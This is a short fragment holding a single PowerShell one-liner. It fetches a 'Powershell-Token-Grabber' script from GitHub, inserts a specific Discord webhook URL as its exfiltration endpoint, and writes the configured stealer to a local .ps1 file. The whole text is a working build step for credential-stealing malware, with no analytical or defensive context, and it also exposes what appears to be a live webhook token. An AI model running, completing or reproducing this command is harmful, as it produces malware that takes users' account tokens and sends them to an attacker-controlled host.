...
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1113808926891327570/5cQPRvmYGso4WobVWkUSekF_LEWFEDN8bX-0xoKT6XHoyWxTrq8tZZpKwdibx1AotOtf' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
